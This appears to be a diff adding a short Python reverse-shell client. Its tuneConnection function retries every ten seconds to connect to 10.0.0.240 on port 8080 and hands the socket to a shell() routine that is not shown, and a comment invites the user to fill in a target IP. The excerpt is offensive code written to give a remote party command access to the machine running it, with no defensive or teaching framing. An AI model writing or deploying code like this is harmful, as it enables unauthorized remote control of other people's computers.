@@ -1,0 +1,17 @@
+import socket
+import subprocess
+import os
+import sys
+import time
+
+def tuneConnection():
+    mySocket = socket.socket()
+    while True:
+        time.sleep(10)
+        #Enter target IP address to replace the Enter IP Here section
+        try:
+            mySocket.connect(("10.0.0.240", 8080))
+            shell(mySocket)
+
+        except:
+            tuneConnection()
